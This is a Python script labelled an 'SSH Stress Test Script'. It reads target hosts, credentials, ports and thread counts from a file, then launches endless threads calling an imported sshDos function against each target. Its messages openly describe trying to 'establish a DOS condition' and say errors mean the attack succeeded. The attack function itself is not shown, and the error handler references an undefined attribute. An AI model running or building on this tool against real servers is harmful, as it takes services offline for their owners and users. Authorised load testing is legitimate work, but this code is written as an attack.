from functions import *
import argparse
import time
import socket
import threading


def main():
    parse = argparse.ArgumentParser(description='SSH Stress Test Script')
    host_group = parse.add_mutually_exclusive_group(required=True)
    host_group.add_argument('-f', action='store', dest='tfile', help='file for server IPs, username, passwords, '
                                                                     'port, threads, attack time')

    print()
    argus = parse.parse_args()

    targets = []
    numTargets = 0
    usernames = []
    passwords = []
    ports = []
    threads = []
    times = []
    targetFile = ""
    if argus.tfile is not None:
        try:
            targetFile = open(argus.tfile, 'r')
        except IOError:
            print("[-] The file %s doesn't exist." % argus.hfile)
            exit(1)
        for line in targetFile.readlines():
            line = line.split(" ")
            targets.append(line[0])
            usernames.append(line[1])
            passwords.append(line[2])
            ports.append(line[3])
            threads.append(line[4])
            times.append(line[5])
            numTargets = numTargets + 1
    else:
        print("No filename given.")

    start_time = time.time()

    for num in range(numTargets):
        print()
        print("Trying to establish a DOS condition with user " + usernames[num] + " and " + threads[num] +
              " threads ...")
        print("If you see some error message probably the attack has succeeded. Press [Ctrl-Z] to stop.")

        while 1:
            for att in range(int(threads[num])):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                t = threading.Thread(target=sshDos, args=(targets[num], ports[num], usernames[num],
                                                          sock, passwords[num], times[num]))
                try:
                    t.start()
                except KeyboardInterrupt:
                    print("Bye !!")
            time.sleep(10)

    print("\nFinished in", time.time() - start_time, "seconds\n")
